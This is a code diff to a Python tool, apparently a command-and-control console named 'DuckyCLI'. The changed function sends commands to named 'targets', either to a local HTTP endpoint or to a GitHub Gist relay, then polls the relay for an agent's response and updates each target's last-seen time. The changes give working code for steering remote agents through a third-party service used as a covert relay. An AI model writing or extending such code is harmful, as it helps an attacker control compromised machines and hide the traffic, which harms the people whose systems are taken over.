@@ -131,27 +131,54 @@ def execute_command(target_name, command):
 
     # Determine if this is a local HTTP endpoint or GitHub Gist
     if url.startswith("http://") and "/api/" in url:
-        # Local HTTP endpoint
-        api_url = f"{url}{command}"
+        # Local HTTP endpoint - send JSON to /api/command/ path
+        api_url = f"{url}command/{command}"
+        try:
+            req = Request(api_url, headers={"User-Agent": "DuckyCLI/1.0"})
+            with urlopen(req, timeout=15) as resp:
+                data = json.loads(resp.read().decode('utf-8'))
+
+                # Update last_seen timestamp
+                target["last_seen"] = time.strftime("%Y-%m-%d %H:%M")
+                targets[target_name] = target
+                save_targets(targets)
+
+                return data
+
+        except (URLError, HTTPError, Exception) as e:
+            print(f"  [!] Connection failed: {e}")
+            return None
     else:
-        # GitHub Gist relay - construct the request URL
-        api_url = f"{url}/command/{command}"
+        # GitHub Gist relay - send JSON to command URL, read from response URL
+        try:
+            cmd_data = json.dumps({"command": command, "args": ""}).encode('utf-8')
+            req = Request(
+                url,
+                data=cmd_data,
+                headers={"User-Agent": "DuckyCLI/1.0", "Content-Type": "application/json"},
+                method="POST" if not url.endswith('.json') else None,
+            )
+            urlopen(req, timeout=10)
 
-    try:
-        req = Request(api_url, headers={"User-Agent": "DuckyCLI/1.0"})
-        with urlopen(req, timeout=15) as resp:
-            data = json.loads(resp.read().decode('utf-8'))
+            # Wait for agent to process (poll for response)
+            time.sleep(3)  # Give the agent time to pick up the command
 
-            # Update last_seen timestamp
-            target["last_seen"] = time.strftime("%Y-%m-%d %H:%M")
-            targets[target_name] = target
-            save_targets(targets)
+            # Read response from GitHub
+            resp_url = url.replace('/command/', '/response/') if '/command/' in url else url + '/response'
+            req = Request(resp_url, headers={"User-Agent": "DuckyCLI/1.0"})
+            with urlopen(req, timeout=10) as resp:
+                data = json.loads(resp.read().decode('utf-8'))
 
-            return data
+                # Update last_seen
+                target["last_seen"] = time.strftime("%Y-%m-%d %H:%M")
+                targets[target_name] = target
+                save_targets(targets)
 
-    except (URLError, HTTPError, Exception) as e:
-        print(f"  [!] Connection failed: {e}")
-        return None
+                return data.get("response", {}) if isinstance(data, dict) else data
+
+        except Exception as e:
+            print(f"  [!] GitHub relay error: {e}")
+            return None
 
 
 def execute_command_via_github(target_name, command):
